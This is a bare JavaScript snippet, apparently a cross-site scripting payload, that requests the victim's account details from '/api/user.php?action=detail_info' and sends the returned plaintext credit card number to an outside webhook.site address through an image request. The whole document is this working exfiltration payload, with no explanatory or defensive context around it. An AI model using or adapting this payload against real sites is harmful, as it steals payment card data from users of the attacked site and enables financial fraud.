fetch("/api/user.php?action=detail_info")
  .then(r => r.json())
  .then(data => {
    new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(data.message.plain_credit_card || 'N/A');
  });